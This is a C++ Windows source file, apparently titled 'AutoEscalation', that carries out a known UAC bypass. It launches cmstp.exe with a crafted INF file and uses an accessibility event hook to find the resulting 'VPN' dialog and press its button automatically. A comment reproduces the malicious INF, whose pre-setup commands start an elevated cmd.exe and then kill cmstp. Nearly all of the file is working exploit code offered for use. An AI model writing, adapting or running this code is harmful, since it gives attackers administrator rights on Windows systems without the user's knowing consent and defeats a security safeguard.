#include "pch.h"
#include "framework.h"
#include "AutoEscalation.h"
#include <oleacc.h>  // Required for AccessibleObjectFromEvent
#include <windows.h>
#pragma comment(lib, "Oleacc.lib")
#include <cstdio>
#include <iostream>
#include <string>

ESCALATION_API BOOL CALLBACK exmButtonCallback(
	_In_ HWND   hwnd
)
{
	UINT i;
	HWND hwndButton;

	SetFocus(hwnd);

	hwndButton = GetDlgItem(hwnd, 1);
	//if (hwndButton == NULL)
	//	hwndButton = GetDlgItem(hwnd, 1117);

	if (hwndButton) {
		// Simulate pressing enter
		SendMessage(hwnd, WM_NEXTDLGCTL, (WPARAM)hwndButton, TRUE);
		PostMessage(hwnd, WM_KEYDOWN, (WPARAM)0x0D, MAKELPARAM(0, 0)); // client relative
		SendMessage(hwnd, WM_NCHITTEST, NULL, MAKELPARAM(0, 0)); // system relative
		PostMessage(hwnd, WM_KEYUP, (WPARAM)0x0D, MAKELPARAM(0, 0)); // client relative

		return TRUE;
	}

	return FALSE;
}

// Callback function that handles events.
ESCALATION_API void CALLBACK exmHandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
	LONG idObject, LONG idChild,
	DWORD dwEventThread, DWORD dwmsEventTime)
{
	
	IAccessible* pAcc = NULL;
	VARIANT varChild;
	HWND hwndNull;
	HRESULT hr = AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild);
	if ((hr == S_OK) && (pAcc != NULL))
	{
		BSTR bstrName;
		pAcc->get_accName(varChild, &bstrName);

		// Debug: Print string length
		/*
		int len = SysStringLen(bstrName);
		wchar_t debugInfo[512];
		//swprintf_s(debugInfo, L"String: '%s'\nLength: %d", bstrName, len);
		//MessageBoxW(NULL, debugInfo, L"Debug Info", MB_OK);

		// Print each character code to check for hidden characters
		std::wstring charCodes;
		for (int i = 0; i < len; i++) {
			wchar_t code[32];
			swprintf_s(code, L"%d ", (int)bstrName[i]);
			charCodes += code;
		}
		*/
		//MessageBoxW(NULL, charCodes.c_str(), L"Character Codes", MB_OK);
		
		char buffer[256];
		WideCharToMultiByte(CP_UTF8, 0, bstrName, -1, buffer, sizeof(buffer), NULL, NULL);
		//MessageBoxA(NULL, buffer, "Window Name", MB_OK);
		if (wcsstr(bstrName, L"VPN") != NULL)  // This will check if "Command" appears anywhere in bstrName
		{
			//printf("Got window, performing callback");
			//MessageBox(NULL, L"Got window, performing callback!", L"WinMain Example", MB_OK);
			exmButtonCallback(hwnd);
			//exmButtonCallback(hwndNull);
		}
		//printf("%S\n", bstrName);
		SysFreeString(bstrName);
		pAcc->Release();
	}
}

ESCALATION_API LPVOID GetMainModuleBaseSecure()
{
	// GET POINTER TO MAIN (.EXE) MODULE BASE
	// Slightly slower (splitting milliseconds), works on x86, ARM, x84
	// Get pointer to the TEB
#if defined(_M_X64) // x64
	auto pTeb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD>(&static_cast<PNT_TIB>(nullptr)->Self)));
#elif defined(_M_ARM) // ARM
	auto pTeb = reinterpret_cast<PTEB>(_MoveFromCoprocessor(15, 0, 13, 0, 2)); // CP15_TPIDRURW
#else // x86
	auto pTeb = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD>(&static_cast<PNT_TIB>(nullptr)->Self)));
#endif

	// Get pointer to the PEB
	auto pPeb = pTeb->ProcessEnvironmentBlock;
	const auto base = pPeb->ImageBaseAddress;
	return base;
}

// Initializes COM and sets up the event hook.
ESCALATION_API HWINEVENTHOOK exmInitializeMSAA(std::wstring& sPayloadPath)
{


	CMSTP cmstp;
	PCMSTP p_cmstp = &cmstp;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	std::wstring commandLine = L"cmstp.exe \"" + sPayloadPath + L"\" /au";
	LPWSTR ncPayloadPath = new WCHAR[commandLine.length() + 1];
	wcscpy_s(ncPayloadPath, commandLine.length() + 1, commandLine.c_str());

	//ILog("Payload path: %ls\n", ncPayloadPath);
	
	CoInitialize(NULL);
	HWINEVENTHOOK hwekWND = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_MENUEND,  // Range of events (4 to 5).
		(HMODULE)GetMainModuleBaseSecure,  // Handle to DLL.
		exmHandleWinEvent,     // The callback.
		0, 0,                  // Process and thread IDs of interest (0 = all)
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS); // Flags.
	/*
	if (hwekWND != 0)
	{
		ILog("Windows event hook set\n");
		MessageBox(NULL, L"Hook set!", L"WinMain Example", MB_OK);
	}
	else
	{
		MessageBox(NULL, L"Failed to set hook!", L"WinMain Example", MB_OK);
		ILog("Failed to set hook\n");
	}
	*/
	CreateProcessW(NULL, ncPayloadPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	//MessageBox(NULL, L"Process created!", L"WinMain Example", MB_OK);

	Sleep(15000);

	delete[] ncPayloadPath;
	return hwekWND;
}

// WinMain calling exmInitializeMSAA
int WINAPI WinMain(
	HINSTANCE hInstance,     // Handle to the current instance
	HINSTANCE hPrevInstance, // Handle to the previous instance (always NULL in modern Windows)
	LPSTR lpCmdLine,         // Command-line arguments as a single string
	int nCmdShow             // Flag for how the window should be shown
) {
	std::wstring sPayloadPath = L"C:\\temp\\test.inf";

	/* Whereas the INF File looks like this:
	
	
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
 
[RunPreSetupCommandsSection]
C:\windows\system32\cmd.exe
taskkill /IM cmstp.exe /F
 
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
 
[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
 
[Strings]
ServiceName=""VPN""
ShortSvcName=""VPN""
	
	
	
	
	
	*/

	/*
	std::cout << "Call it" << std::endl; // Better than printf
	fflush(stdout);  // Ensure output is flushed
	MessageBox(NULL, L"Call it!", L"WinMain Example", MB_OK);
	*/
	exmInitializeMSAA(sPayloadPath);
	//MessageBox(NULL, L"Done!", L"WinMain Example", MB_OK);

	//std::cout << "Done" << std::endl;
	//fflush(stdout);  // Ensure output appears before exit
	return 0;
}

// Unhooks the event and shuts down COM.
ESCALATION_API void exmShutdownMSAA(HWINEVENTHOOK hwekWND)
{
	UnhookWinEvent(hwekWND);
	CoUninitialize();
}
